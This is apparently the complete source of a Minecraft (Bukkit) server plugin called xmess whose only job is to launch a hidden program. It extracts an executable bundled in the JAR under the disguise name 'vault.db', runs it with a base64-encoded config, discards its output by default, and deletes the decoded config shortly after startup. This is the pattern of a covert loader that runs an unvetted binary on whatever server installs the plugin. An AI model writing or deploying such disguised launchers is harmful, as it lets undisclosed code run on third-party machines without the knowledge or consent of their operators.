package xmess;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.configuration.file.FileConfiguration;
import java.io.*;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Base64;
import java.util.concurrent.CompletableFuture;

public class Main extends JavaPlugin {

    private Process socketProcess;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        reloadConfig();
        FileConfiguration cfg = getConfig();

        boolean logs = cfg.getBoolean("settings.logs", false);
        String jsonB64 = cfg.getString("settings.json", "");
        String dbName = cfg.getString("settings.db", "vault.db");

        File configFile = null;
        if (!jsonB64.isEmpty()) {
            try {
                configFile = createConfigFile(jsonB64);
            } catch (Exception e) {
                getLogger().severe("Config error: " + e.getMessage());
                disablePlugin();
                return;
            }
        }

        try {
            File socketFile = extractSocket(dbName);

            ArrayList<String> args = new ArrayList<>();
            args.add(socketFile.getAbsolutePath());
            if (configFile != null) {
                args.add("-c");
                args.add(configFile.getAbsolutePath());
            }

            ProcessBuilder pb = new ProcessBuilder(args.toArray(new String[0]));
            pb.directory(getDataFolder().getParentFile());

            if (!logs) {
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            }

            socketProcess = pb.start();

            if (logs) {
                CompletableFuture.runAsync(() -> {
                    try (
                        BufferedReader in = new BufferedReader(
                            new InputStreamReader(socketProcess.getInputStream()));
                        BufferedReader err = new BufferedReader(
                            new InputStreamReader(socketProcess.getErrorStream()))
                    ) {
                        String line;
                        while ((line = in.readLine()) != null) {
                            getLogger().info("[xmess] " + line);
                        }
                        while ((line = err.readLine()) != null) {
                            getLogger().warning("[xmess] " + line);
                        }
                    } catch (IOException ignored) {}
                });
            }

            getLogger().info("xMess socket started");

        } catch (Exception e) {
            getLogger().severe("Socket error: " + e.getMessage());
            disablePlugin();
            return;
        }

        Bukkit.getScheduler().runTaskLater(this, () -> {
            File cfgFile = new File(getDataFolder(), "socket-config.json");
            if (cfgFile.exists()) {
                cfgFile.delete();
            }
        }, 60L);
    }

    @Override
    public void onDisable() {
        if (socketProcess != null && socketProcess.isAlive()) {
            socketProcess.destroyForcibly();
        }
    }

    private File extractSocket(String dbName) throws IOException {
        getDataFolder().mkdirs();
        File socketFile = new File(getDataFolder(), dbName);

        if (!socketFile.exists()) {
            try (InputStream is = getClass().getResourceAsStream("/" + dbName)) {
                if (is == null) {
                    throw new FileNotFoundException("socket resource not found in JAR resources: " + dbName);
                }
                Files.copy(is, socketFile.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            }
        }

        socketFile.setExecutable(true);
        return socketFile;
    }

    private File createConfigFile(String b64) throws IOException {
        byte[] bytes = Base64.getDecoder().decode(b64);
        File cfgFile = new File(getDataFolder(), "socket-config.json");
        Files.write(cfgFile.toPath(), bytes);
        return cfgFile;
    }

    private void disablePlugin() {
        getServer().getPluginManager().disablePlugin(this);
    }
}
